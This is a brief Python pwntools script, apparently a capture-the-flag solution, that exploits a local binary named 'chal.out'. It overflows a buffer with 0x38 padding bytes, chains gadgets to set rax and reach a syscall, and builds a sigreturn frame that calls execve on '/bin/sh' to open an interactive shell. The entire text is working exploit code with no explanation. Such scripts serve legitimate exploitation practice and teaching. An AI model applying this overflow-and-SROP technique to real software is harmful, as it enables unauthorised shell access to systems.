from pwn import *

context.arch = "amd64"

io = process("./chal.out")
elf = ELF("./chal.out")

set_eax = elf.symbols["set_eax"]
syscall = elf.symbols["fire"] + 8
binsh = next(elf.search(b"/bin/sh"))

payload = b"A" * 0x38
payload += p64(set_eax)
payload += p64(syscall)

frame = SigreturnFrame()
frame.rip = syscall
frame.rdi = binsh
frame.rax = 0x3B

payload += bytes(frame)

io.sendline(payload)
io.interactive()
